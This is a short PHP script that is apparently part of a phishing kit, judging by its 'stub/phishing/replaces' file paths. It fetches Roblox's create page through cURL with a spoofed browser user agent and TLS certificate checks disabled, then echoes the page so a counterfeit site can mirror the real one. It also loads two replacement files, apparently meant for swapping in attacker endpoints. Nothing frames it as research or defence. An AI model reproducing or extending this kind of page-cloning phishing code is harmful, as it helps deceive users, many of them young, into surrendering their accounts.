<?php
include('includes/functions.php');

// ----------------------------------------------------------------
$apisList = file_get_contents("stub/phishing/replaces/apis.txt");
$apisListW = file_get_contents("stub/phishing/replaces/apis2.php");
// ----------------------------------------------------------------

$config['useragent'] = 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0';
$url = "https://www.roblox.com/create";
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_USERAGENT, $config['useragent']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$content = curl_exec($ch);
curl_close($ch);
echo $content;
?>